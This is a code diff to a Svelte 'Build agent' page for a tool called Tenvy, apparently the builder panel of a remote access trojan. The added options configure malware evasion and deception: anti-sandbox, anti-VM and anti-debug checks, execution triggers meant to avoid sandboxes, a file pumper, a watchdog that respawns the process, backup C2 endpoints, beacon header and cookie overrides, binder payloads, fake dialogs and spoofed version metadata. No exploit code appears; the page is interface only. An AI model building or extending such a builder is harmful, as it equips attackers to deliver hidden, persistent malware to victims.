@@ -1,4 +1,5 @@
 <script lang="ts">
+	import { Badge } from '$lib/components/ui/badge/index.js';
 	import { Button } from '$lib/components/ui/button/index.js';
 	import {
 		Card,
@@ -8,11 +9,25 @@
 		CardHeader,
 		CardTitle
 	} from '$lib/components/ui/card/index.js';
+	import {
+		Collapsible,
+		CollapsibleContent,
+		CollapsibleTrigger
+	} from '$lib/components/ui/collapsible/index.js';
 	import { Input } from '$lib/components/ui/input/index.js';
 	import { Label } from '$lib/components/ui/label/index.js';
 	import { Progress } from '$lib/components/ui/progress/index.js';
 	import { Switch } from '$lib/components/ui/switch/index.js';
-	import { TriangleAlert, CircleCheck, Info } from '@lucide/svelte';
+	import { Textarea } from '$lib/components/ui/textarea/index.js';
+	import {
+		TriangleAlert,
+		CircleCheck,
+		Info,
+		ChevronDown,
+		Plus,
+		Trash2,
+		Wand2
+	} from '@lucide/svelte';
 	import { onDestroy } from 'svelte';
 
 	type BuildStatus = 'idle' | 'running' | 'success' | 'error';
@@ -39,9 +54,9 @@
 	];
 
 	const extensionOptionsByOS: Record<TargetOS, string[]> = {
-		windows: ['.exe', '.bat'],
-		linux: ['.bin'],
-		darwin: ['.bin']
+		windows: ['.exe', '.msi', '.bat', '.scr', '.com', '.ps1'],
+		linux: ['.bin', '.run', '.sh'],
+		darwin: ['.bin', '.pkg', '.app']
 	};
 
 	const architectureOptionsByOS: Record<TargetOS, { value: TargetArch; label: string }[]> = {
@@ -92,6 +107,51 @@
 		legalCopyright: ''
 	} as const;
 	let fileInformation = $state({ ...defaultFileInformation });
+
+	const antiTamperBadges = ['Anti-Sandbox', 'Anti-VM', 'Anti-Debug'] as const;
+	const installationPathPresets = [
+		{ label: '%AppData%\\Tenvy', value: '%AppData%\\Tenvy' },
+		{ label: '%USERPROFILE%\\Tenvy', value: '%USERPROFILE%\\Tenvy' },
+		{ label: '~/.config/tenvy', value: '~/.config/tenvy' }
+	] as const;
+	const filePumperUnits = ['KB', 'MB', 'GB'] as const;
+	const fakeDialogOptions = [
+		{ value: 'none', label: 'Disabled' },
+		{ value: 'error', label: 'Error dialog' },
+		{ value: 'warning', label: 'Warning dialog' },
+		{ value: 'info', label: 'Information dialog' }
+	] as const;
+
+	const inputFieldClasses =
+		'flex h-9 w-full min-w-0 rounded-md border border-input bg-background px-3 py-1 text-base shadow-xs ring-offset-background transition-[color,box-shadow] outline-none selection:bg-primary selection:text-primary-foreground placeholder:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50 md:text-sm dark:bg-input/30 focus-visible:border-ring focus-visible:ring-[3px] focus-visible:ring-ring/50 aria-invalid:border-destructive aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40';
+
+	type Endpoint = { host: string; port: string };
+	type HeaderKV = { key: string; value: string };
+	type CookieKV = { name: string; value: string };
+
+	let fileInformationOpen = $state(false);
+	let groupTag = $state('');
+	let fallbackEndpoints = $state<Endpoint[]>([{ host: '', port: '' }]);
+	let watchdogEnabled = $state(false);
+	let watchdogIntervalSeconds = $state('60');
+	let enableFilePumper = $state(false);
+	let filePumperTargetSize = $state('');
+	let filePumperUnit = $state<(typeof filePumperUnits)[number]>('MB');
+	let executionDelaySeconds = $state('');
+	let executionAllowedUsernames = $state('');
+	let executionAllowedLocales = $state('');
+	let executionMinUptimeMinutes = $state('');
+	let executionStartDate = $state('');
+	let executionEndDate = $state('');
+	let executionRequireInternet = $state(true);
+	let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
+	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
+	let fakeDialogType = $state<(typeof fakeDialogOptions)[number]['value']>('none');
+	let fakeDialogTitle = $state('');
+	let fakeDialogMessage = $state('');
+	let binderFileName = $state<string | null>(null);
+	let binderFileSize = $state<number | null>(null);
+	let binderFileError = $state<string | null>(null);
 
 	const isWindowsTarget = $derived(targetOS === 'windows');
 
@@ -166,6 +226,110 @@
 		return Object.fromEntries(entries.filter(([, value]) => value !== ''));
 	}
 
+	function applyInstallationPreset(preset: string) {
+		installationPath = preset;
+	}
+
+	function normalizedPortValue(value: string) {
+		return value.replace(/[^0-9]/g, '');
+	}
+
+	function setFallbackEndpoint(index: number, key: 'host' | 'port', value: string) {
+		fallbackEndpoints = fallbackEndpoints.map((endpoint, idx) => {
+			if (idx !== index) {
+				return endpoint;
+			}
+
+			if (key === 'port') {
+				return { ...endpoint, port: normalizedPortValue(value) };
+			}
+
+			return { ...endpoint, host: value };
+		});
+	}
+
+	function addFallbackEndpoint() {
+		fallbackEndpoints = [...fallbackEndpoints, { host: '', port: '' }];
+	}
+
+	function removeFallbackEndpoint(index: number) {
+		fallbackEndpoints = fallbackEndpoints.filter((_, idx) => idx !== index);
+		if (fallbackEndpoints.length === 0) {
+			fallbackEndpoints = [{ host: '', port: '' }];
+		}
+	}
+
+	function addCustomHeader() {
+		customHeaders = [...customHeaders, { key: '', value: '' }];
+	}
+
+	function updateCustomHeader(index: number, key: keyof HeaderKV, value: string) {
+		customHeaders = customHeaders.map((header, idx) =>
+			idx === index ? { ...header, [key]: value } : header
+		);
+	}
+
+	function removeCustomHeader(index: number) {
+		customHeaders = customHeaders.filter((_, idx) => idx !== index);
+		if (customHeaders.length === 0) {
+			customHeaders = [{ key: '', value: '' }];
+		}
+	}
+
+	function addCustomCookie() {
+		customCookies = [...customCookies, { name: '', value: '' }];
+	}
+
+	function updateCustomCookie(index: number, key: keyof CookieKV, value: string) {
+		customCookies = customCookies.map((cookie, idx) =>
+			idx === index ? { ...cookie, [key]: value } : cookie
+		);
+	}
+
+	function removeCustomCookie(index: number) {
+		customCookies = customCookies.filter((_, idx) => idx !== index);
+		if (customCookies.length === 0) {
+			customCookies = [{ name: '', value: '' }];
+		}
+	}
+
+	function generateMutexName(length = 16) {
+		const bytes = new Uint8Array(Math.ceil(length / 2));
+		if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
+			crypto.getRandomValues(bytes);
+		} else {
+			for (let i = 0; i < bytes.length; i += 1) {
+				bytes[i] = Math.floor(Math.random() * 256);
+			}
+		}
+		const suffix = Array.from(bytes, (byte) => byte.toString(16).padStart(2, '0'))
+			.join('')
+			.slice(0, length)
+			.toUpperCase();
+		mutexName = `Global\\tenvy-${suffix}`;
+	}
+
+	const binderSizeLimitBytes = 50 * 1024 * 1024;
+
+	function formatFileSize(bytes: number | null) {
+		if (!bytes || !Number.isFinite(bytes)) {
+			return '';
+		}
+
+		if (bytes >= 1024 * 1024 * 10) {
+			return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
+		}
+		if (bytes >= 1024) {
+			return `${(bytes / 1024).toFixed(1)} KB`;
+		}
+		return `${bytes} B`;
+	}
+
+	function inputValueFromEvent(event: Event) {
+		const target = event.target as HTMLInputElement | HTMLTextAreaElement | null;
+		return target?.value ?? '';
+	}
+
 	async function handleIconSelection(event: Event) {
 		const input = event.target as HTMLInputElement;
 		const file = input.files?.[0] ?? null;
@@ -204,6 +368,34 @@
 		fileIconName = null;
 		fileIconData = null;
 		fileIconError = null;
+	}
+
+	async function handleBinderSelection(event: Event) {
+		const input = event.target as HTMLInputElement;
+		const file = input.files?.[0] ?? null;
+		binderFileError = null;
+
+		if (!file) {
+			binderFileName = null;
+			binderFileSize = null;
+			return;
+		}
+
+		if (file.size > binderSizeLimitBytes) {
+			binderFileError = 'Binder payload must be 50MB or smaller.';
+			binderFileName = null;
+			binderFileSize = null;
+			return;
+		}
+
+		binderFileName = file.name;
+		binderFileSize = file.size;
+	}
+
+	function clearBinderSelection() {
+		binderFileName = null;
+		binderFileSize = null;
+		binderFileError = null;
 	}
 
 	async function buildAgent() {
@@ -394,11 +586,29 @@
 
 <div class="mx-auto max-w-4xl">
 	<Card>
-		<CardHeader>
-			<CardTitle>Build agent</CardTitle>
-			<CardDescription>
-				Configure connection and persistence options, then generate a customized client binary.
-			</CardDescription>
+		<CardHeader class="space-y-4">
+			<div class="flex flex-wrap items-center justify-between gap-3">
+				<div class="space-y-1">
+					<CardTitle>Build agent</CardTitle>
+					<CardDescription>
+						Configure connection and persistence options, then generate a customized client binary.
+					</CardDescription>
+				</div>
+				<div class="flex flex-wrap gap-2">
+					{#each antiTamperBadges as badge}
+						<Badge
+							variant="outline"
+							class="border-emerald-500/40 bg-emerald-500/10 text-[0.65rem] font-medium tracking-wide text-emerald-600 uppercase"
+						>
+							{badge}
+						</Badge>
+					{/each}
+				</div>
+			</div>
+			<p class="text-xs text-muted-foreground">
+				These safeguards are always embedded into generated builds. Customize the remaining options
+				to match your delivery strategy.
+			</p>
 		</CardHeader>
 		<CardContent class="space-y-8">
 			<div class="grid gap-6 md:grid-cols-2">
@@ -413,6 +623,13 @@
 				<div class="grid gap-2">
 					<Label for="output">Output filename</Label>
 					<Input id="output" placeholder="tenvy-client" bind:value={outputFilename} />
+				</div>
+				<div class="grid gap-2">
+					<Label for="group-tag">Group tag</Label>
+					<Input id="group-tag" placeholder="operations-east" bind:value={groupTag} />
+					<p class="text-xs text-muted-foreground">
+						Optional label used to keep related deployments together.
+					</p>
 				</div>
 				<div class="grid gap-2">
 					<Label for="target-os">Target operating system</Label>
@@ -453,14 +670,89 @@
 				<div class="grid gap-2">
 					<Label for="path">Installation path</Label>
 					<Input id="path" placeholder="/usr/local/bin/tenvy" bind:value={installationPath} />
+					<div class="flex flex-wrap items-center gap-2 text-xs text-muted-foreground">
+						<span class="font-medium text-muted-foreground/80">Quick fill:</span>
+						{#each installationPathPresets as preset}
+							<Button
+								type="button"
+								variant="ghost"
+								size="sm"
+								class="h-7 rounded-full border border-border/70 px-3 text-[0.65rem] font-semibold text-muted-foreground hover:bg-muted"
+								onclick={() => applyInstallationPreset(preset.value)}
+							>
+								{preset.label}
+							</Button>
+						{/each}
+					</div>
+				</div>
+				<div class="space-y-3 md:col-span-2">
+					<div class="flex flex-wrap items-center justify-between gap-2">
+						<div>
+							<p class="text-sm font-medium">Backup C2 endpoints</p>
+							<p class="text-xs text-muted-foreground">
+								Provide failover hosts that will be attempted if the primary controller is
+								unreachable.
+							</p>
+						</div>
+						<Button type="button" variant="outline" size="sm" onclick={addFallbackEndpoint}>
+							<Plus class="h-4 w-4" />
+							Add endpoint
+						</Button>
+					</div>
+					<div class="space-y-3">
+						{#each fallbackEndpoints as endpoint, index (index)}
+							<div
+								class="grid gap-2 md:grid-cols-[minmax(0,1.5fr)_minmax(0,1fr)_auto] md:items-center"
+							>
+								<input
+									class={inputFieldClasses}
+									placeholder="controller-backup.tenvy.local"
+									value={endpoint.host}
+									oninput={(event) =>
+										setFallbackEndpoint(index, 'host', inputValueFromEvent(event))}
+								/>
+								<input
+									class={inputFieldClasses}
+									placeholder="2332"
+									value={endpoint.port}
+									inputmode="numeric"
+									oninput={(event) =>
+										setFallbackEndpoint(index, 'port', inputValueFromEvent(event))}
+								/>
+								<Button
+									type="button"
+									variant="ghost"
+									size="sm"
+									class="text-destructive hover:text-destructive"
+									onclick={() => removeFallbackEndpoint(index)}
+								>
+									<Trash2 class="h-4 w-4" />
+									<span class="sr-only">Remove endpoint</span>
+								</Button>
+							</div>
+						{/each}
+					</div>
 				</div>
 				<div class="grid gap-2 md:col-span-2">
 					<Label for="mutex">Mutex name</Label>
-					<Input
-						id="mutex"
-						placeholder="Ensures only a single instance can run"
-						bind:value={mutexName}
-					/>
+					<div class="flex flex-col gap-2 sm:flex-row sm:items-center">
+						<Input
+							id="mutex"
+							placeholder="Ensures only a single instance can run"
+							class="sm:flex-1"
+							bind:value={mutexName}
+						/>
+						<Button
+							type="button"
+							variant="outline"
+							size="sm"
+							class="shrink-0"
+							onclick={() => generateMutexName()}
+						>
+							<Wand2 class="h-4 w-4" />
+							Generate
+						</Button>
+					</div>
 					<p class="text-xs text-muted-foreground">
 						Optional. Leave blank to allow multiple instances. Unsupported characters are replaced
 						automatically.
@@ -530,6 +822,81 @@
 					</div>
 					<Switch bind:checked={forceAdmin} aria-label="Toggle administrator requirement" />
 				</div>
+				<div
+					class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
+				>
+					<div class="w-full">
+						<p class="text-sm font-medium">Watchdog</p>
+						<p class="text-xs text-muted-foreground">
+							Respawn the agent if the process is terminated unexpectedly.
+						</p>
+						{#if watchdogEnabled}
+							<div class="mt-3 grid gap-1 text-xs">
+								<Label
+									for="watchdog-interval"
+									class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
+								>
+									Respawn delay (s)
+								</Label>
+								<Input
+									id="watchdog-interval"
+									class="h-8 text-xs"
+									placeholder="60"
+									bind:value={watchdogIntervalSeconds}
+									inputmode="numeric"
+								/>
+							</div>
+						{/if}
+					</div>
+					<Switch bind:checked={watchdogEnabled} aria-label="Toggle watchdog respawn" />
+				</div>
+				<div
+					class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
+				>
+					<div class="w-full">
+						<p class="text-sm font-medium">File pumper</p>
+						<p class="text-xs text-muted-foreground">
+							Pad the binary with random data to reach a desired minimum size.
+						</p>
+						{#if enableFilePumper}
+							<div class="mt-3 grid gap-3 text-xs sm:grid-cols-[minmax(0,1fr)_auto] sm:items-end">
+								<div class="grid gap-1">
+									<Label
+										for="file-pumper-size"
+										class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
+									>
+										Target size
+									</Label>
+									<Input
+										id="file-pumper-size"
+										class="h-8 text-xs"
+										placeholder="500"
+										bind:value={filePumperTargetSize}
+										inputmode="numeric"
+									/>
+								</div>
+								<div class="grid gap-1">
+									<Label
+										for="file-pumper-unit"
+										class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
+									>
+										Unit
+									</Label>
+									<select
+										id="file-pumper-unit"
+										bind:value={filePumperUnit}
+										class="flex h-8 w-full items-center justify-between rounded-md border border-input bg-background px-2 text-xs ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none"
+									>
+										{#each filePumperUnits as unit}
+											<option value={unit}>{unit}</option>
+										{/each}
+									</select>
+								</div>
+							</div>
+						{/if}
+					</div>
+					<Switch bind:checked={enableFilePumper} aria-label="Toggle file pumper" />
+				</div>
 			</div>
 
 			<div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
@@ -571,6 +938,272 @@
 				</div>
 			</div>
 
+			<div class="space-y-4 rounded-lg border border-dashed border-border/70 p-4">
+				<div class="flex flex-wrap items-center justify-between gap-2">
+					<div>
+						<p class="text-sm font-semibold">Execution triggers</p>
+						<p class="text-xs text-muted-foreground">
+							Gate execution behind environmental cues to reduce sandbox exposure.
+						</p>
+					</div>
+					<Badge
+						variant="outline"
+						class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
+					>
+						Optional
+					</Badge>
+				</div>
+				<div class="grid gap-4 md:grid-cols-2">
+					<div class="grid gap-2">
+						<Label for="execution-delay">Delayed start (seconds)</Label>
+						<Input
+							id="execution-delay"
+							placeholder="30"
+							bind:value={executionDelaySeconds}
+							inputmode="numeric"
+						/>
+						<p class="text-xs text-muted-foreground">Leave blank to run immediately.</p>
+					</div>
+					<div class="grid gap-2">
+						<Label for="execution-uptime">Minimum system uptime (minutes)</Label>
+						<Input
+							id="execution-uptime"
+							placeholder="10"
+							bind:value={executionMinUptimeMinutes}
+							inputmode="numeric"
+						/>
+						<p class="text-xs text-muted-foreground">
+							Helps avoid sandboxes that reboot frequently.
+						</p>
+					</div>
+					<div class="grid gap-2">
+						<Label for="execution-usernames">Allowed usernames</Label>
+						<Input
+							id="execution-usernames"
+							placeholder="administrator,svc-account"
+							bind:value={executionAllowedUsernames}
+						/>
+						<p class="text-xs text-muted-foreground">
+							Only execute when the current user matches one of these entries.
+						</p>
+					</div>
+					<div class="grid gap-2">
+						<Label for="execution-locales">Allowed locales</Label>
+						<Input
+							id="execution-locales"
+							placeholder="en-US, fr-FR"
+							bind:value={executionAllowedLocales}
+						/>
+						<p class="text-xs text-muted-foreground">
+							Restrict execution to systems with matching locale identifiers.
+						</p>
+					</div>
+					<div class="grid gap-2">
+						<Label for="execution-start">Earliest run time</Label>
+						<Input id="execution-start" type="datetime-local" bind:value={executionStartDate} />
+					</div>
+					<div class="grid gap-2">
+						<Label for="execution-end">Latest run time</Label>
+						<Input id="execution-end" type="datetime-local" bind:value={executionEndDate} />
+					</div>
+				</div>
+				<div
+					class="flex items-center justify-between gap-4 rounded-md border border-border/60 bg-muted/30 px-4 py-3 text-xs"
+				>
+					<div>
+						<p class="font-medium">Require internet connectivity</p>
+						<p class="text-muted-foreground">
+							Delay execution until a network connection is available.
+						</p>
+					</div>
+					<Switch
+						bind:checked={executionRequireInternet}
+						aria-label="Toggle internet connectivity requirement"
+					/>
+				</div>
+			</div>
+
+			<div class="space-y-6 rounded-lg border border-dashed border-border/70 p-4">
+				<div class="flex flex-wrap items-center justify-between gap-2">
+					<div>
+						<p class="text-sm font-semibold">Network customization</p>
+						<p class="text-xs text-muted-foreground">
+							Override HTTP headers or cookies embedded in beacon traffic.
+						</p>
+					</div>
+					<Badge
+						variant="outline"
+						class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
+					>
+						Advanced
+					</Badge>
+				</div>
+				<div class="space-y-3">
+					<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
+						Custom headers
+					</p>
+					<div class="space-y-3">
+						{#each customHeaders as header, index (index)}
+							<div
+								class="grid gap-2 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)_auto] md:items-center"
+							>
+								<input
+									class={inputFieldClasses}
+									placeholder="Header name"
+									value={header.key}
+									oninput={(event) => updateCustomHeader(index, 'key', inputValueFromEvent(event))}
+								/>
+								<input
+									class={inputFieldClasses}
+									placeholder="Header value"
+									value={header.value}
+									oninput={(event) =>
+										updateCustomHeader(index, 'value', inputValueFromEvent(event))}
+								/>
+								<Button
+									type="button"
+									variant="ghost"
+									size="sm"
+									class="text-destructive hover:text-destructive"
+									onclick={() => removeCustomHeader(index)}
+								>
+									<Trash2 class="h-4 w-4" />
+									<span class="sr-only">Remove header</span>
+								</Button>
+							</div>
+						{/each}
+					</div>
+					<Button
+						type="button"
+						variant="ghost"
+						size="sm"
+						class="text-xs font-semibold tracking-wide text-muted-foreground uppercase"
+						onclick={addCustomHeader}
+					>
+						<Plus class="h-4 w-4" />
+						Add header
+					</Button>
+				</div>
+				<div class="space-y-3">
+					<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
+						Custom cookies
+					</p>
+					<div class="space-y-3">
+						{#each customCookies as cookie, index (index)}
+							<div
+								class="grid gap-2 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)_auto] md:items-center"
+							>
+								<input
+									class={inputFieldClasses}
+									placeholder="Cookie name"
+									value={cookie.name}
+									oninput={(event) => updateCustomCookie(index, 'name', inputValueFromEvent(event))}
+								/>
+								<input
+									class={inputFieldClasses}
+									placeholder="Cookie value"
+									value={cookie.value}
+									oninput={(event) =>
+										updateCustomCookie(index, 'value', inputValueFromEvent(event))}
+								/>
+								<Button
+									type="button"
+									variant="ghost"
+									size="sm"
+									class="text-destructive hover:text-destructive"
+									onclick={() => removeCustomCookie(index)}
+								>
+									<Trash2 class="h-4 w-4" />
+									<span class="sr-only">Remove cookie</span>
+								</Button>
+							</div>
+						{/each}
+					</div>
+					<Button
+						type="button"
+						variant="ghost"
+						size="sm"
+						class="text-xs font-semibold tracking-wide text-muted-foreground uppercase"
+						onclick={addCustomCookie}
+					>
+						<Plus class="h-4 w-4" />
+						Add cookie
+					</Button>
+				</div>
+			</div>
+
+			<div class="space-y-4 rounded-lg border border-dashed border-border/70 p-4">
+				<div>
+					<p class="text-sm font-semibold">Presentation</p>
+					<p class="text-xs text-muted-foreground">
+						Blend the installer with an optional binder payload or decoy dialog.
+					</p>
+				</div>
+				<div class="space-y-3">
+					<Label for="binder-file">Binder payload</Label>
+					<div class="flex flex-col gap-3 rounded-lg border border-dashed border-border/60 p-4">
+						<input id="binder-file" type="file" class="text-xs" onchange={handleBinderSelection} />
+						{#if binderFileName}
+							<div
+								class="flex items-center justify-between gap-3 rounded-md bg-muted/40 px-3 py-2 text-xs"
+							>
+								<div>
+									<p class="font-medium">{binderFileName}</p>
+									{#if binderFileSize}
+										<p class="text-muted-foreground">{formatFileSize(binderFileSize)}</p>
+									{/if}
+								</div>
+								<button type="button" class="text-primary underline" onclick={clearBinderSelection}>
+									Remove
+								</button>
+							</div>
+						{/if}
+						{#if binderFileError}
+							<p class="text-xs text-red-500">{binderFileError}</p>
+						{/if}
+						<p class="text-xs text-muted-foreground">
+							Optional. Attach an additional file to deploy alongside the agent.
+						</p>
+					</div>
+				</div>
+				<div class="grid gap-4 md:grid-cols-2">
+					<div class="grid gap-2">
+						<Label for="fake-dialog-type">Fake dialog</Label>
+						<select
+							id="fake-dialog-type"
+							bind:value={fakeDialogType}
+							class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none"
+						>
+							{#each fakeDialogOptions as option}
+								<option value={option.value}>{option.label}</option>
+							{/each}
+						</select>
+					</div>
+					<div class="grid gap-2">
+						<Label for="fake-dialog-title">Dialog title</Label>
+						<Input
+							id="fake-dialog-title"
+							placeholder="Installation complete"
+							bind:value={fakeDialogTitle}
+							disabled={fakeDialogType === 'none'}
+						/>
+					</div>
+					<div class="grid gap-2 md:col-span-2">
+						<Label for="fake-dialog-message">Dialog message</Label>
+						<Textarea
+							id="fake-dialog-message"
+							placeholder="The setup completed successfully."
+							bind:value={fakeDialogMessage}
+							class="min-h-[120px]"
+							disabled={fakeDialogType === 'none'}
+						/>
+						<p class="text-xs text-muted-foreground">
+							Leave blank to use sensible defaults based on the dialog type.
+						</p>
+					</div>
+				</div>
+			</div>
+
 			{#if isWindowsTarget}
 				<div class="space-y-6">
 					<div class="space-y-3">
@@ -602,80 +1235,95 @@
 						</div>
 					</div>
 
-					<div class="space-y-3">
-						<div>
-							<h3 class="text-sm font-semibold">File information</h3>
-							<p class="text-xs text-muted-foreground">
-								Populate Windows version metadata for the compiled binary.
-							</p>
+					<Collapsible
+						class="rounded-lg border border-border/70 p-4"
+						bind:open={fileInformationOpen}
+					>
+						<div class="flex flex-wrap items-center justify-between gap-3">
+							<div>
+								<h3 class="text-sm font-semibold">File information</h3>
+								<p class="text-xs text-muted-foreground">
+									Populate Windows version metadata for the compiled binary.
+								</p>
+							</div>
+							<CollapsibleTrigger
+								class="flex items-center gap-2 rounded-md border border-border/60 px-3 py-1.5 text-xs font-semibold tracking-wide text-muted-foreground uppercase transition hover:bg-muted"
+							>
+								<span>{fileInformationOpen ? 'Hide metadata' : 'Show metadata'}</span>
+								<ChevronDown
+									class={`h-4 w-4 transition-transform ${fileInformationOpen ? 'rotate-180' : ''}`}
+								/>
+							</CollapsibleTrigger>
 						</div>
-						<div class="grid gap-4 md:grid-cols-2">
-							<div class="grid gap-2">
-								<Label for="file-description">File description</Label>
-								<Input
-									id="file-description"
-									placeholder="Background client"
-									bind:value={fileInformation.fileDescription}
-								/>
+						<CollapsibleContent class="mt-4 space-y-4">
+							<div class="grid gap-4 md:grid-cols-2">
+								<div class="grid gap-2">
+									<Label for="file-description">File description</Label>
+									<Input
+										id="file-description"
+										placeholder="Background client"
+										bind:value={fileInformation.fileDescription}
+									/>
+								</div>
+								<div class="grid gap-2">
+									<Label for="product-name">Product name</Label>
+									<Input
+										id="product-name"
+										placeholder="Tenvy Agent"
+										bind:value={fileInformation.productName}
+									/>
+								</div>
+								<div class="grid gap-2">
+									<Label for="company-name">Company name</Label>
+									<Input
+										id="company-name"
+										placeholder="Tenvy Operators"
+										bind:value={fileInformation.companyName}
+									/>
+								</div>
+								<div class="grid gap-2">
+									<Label for="product-version">Product version</Label>
+									<Input
+										id="product-version"
+										placeholder="1.0.0.0"
+										bind:value={fileInformation.productVersion}
+									/>
+								</div>
+								<div class="grid gap-2">
+									<Label for="file-version">File version</Label>
+									<Input
+										id="file-version"
+										placeholder="1.0.0.0"
+										bind:value={fileInformation.fileVersion}
+									/>
+								</div>
+								<div class="grid gap-2">
+									<Label for="original-filename">Original filename</Label>
+									<Input
+										id="original-filename"
+										placeholder="tenvy-client.exe"
+										bind:value={fileInformation.originalFilename}
+									/>
+								</div>
+								<div class="grid gap-2">
+									<Label for="internal-name">Internal name</Label>
+									<Input
+										id="internal-name"
+										placeholder="tenvy-client"
+										bind:value={fileInformation.internalName}
+									/>
+								</div>
+								<div class="grid gap-2">
+									<Label for="legal-copyright">Legal copyright</Label>
+									<Input
+										id="legal-copyright"
+										placeholder="© 2025 Tenvy"
+										bind:value={fileInformation.legalCopyright}
+									/>
+								</div>
 							</div>
-							<div class="grid gap-2">
-								<Label for="product-name">Product name</Label>
-								<Input
-									id="product-name"
-									placeholder="Tenvy Agent"
-									bind:value={fileInformation.productName}
-								/>
-							</div>
-							<div class="grid gap-2">
-								<Label for="company-name">Company name</Label>
-								<Input
-									id="company-name"
-									placeholder="Tenvy Operators"
-									bind:value={fileInformation.companyName}
-								/>
-							</div>
-							<div class="grid gap-2">
-								<Label for="product-version">Product version</Label>
-								<Input
-									id="product-version"
-									placeholder="1.0.0.0"
-									bind:value={fileInformation.productVersion}
-								/>
-							</div>
-							<div class="grid gap-2">
-								<Label for="file-version">File version</Label>
-								<Input
-									id="file-version"
-									placeholder="1.0.0.0"
-									bind:value={fileInformation.fileVersion}
-								/>
-							</div>
-							<div class="grid gap-2">
-								<Label for="original-filename">Original filename</Label>
-								<Input
-									id="original-filename"
-									placeholder="tenvy-client.exe"
-									bind:value={fileInformation.originalFilename}
-								/>
-							</div>
-							<div class="grid gap-2">
-								<Label for="internal-name">Internal name</Label>
-								<Input
-									id="internal-name"
-									placeholder="tenvy-client"
-									bind:value={fileInformation.internalName}
-								/>
-							</div>
-							<div class="grid gap-2">
-								<Label for="legal-copyright">Legal copyright</Label>
-								<Input
-									id="legal-copyright"
-									placeholder="© 2025 Tenvy"
-									bind:value={fileInformation.legalCopyright}
-								/>
-							</div>
-						</div>
-					</div>
+						</CollapsibleContent>
+					</Collapsible>
 				</div>
 			{/if}
 
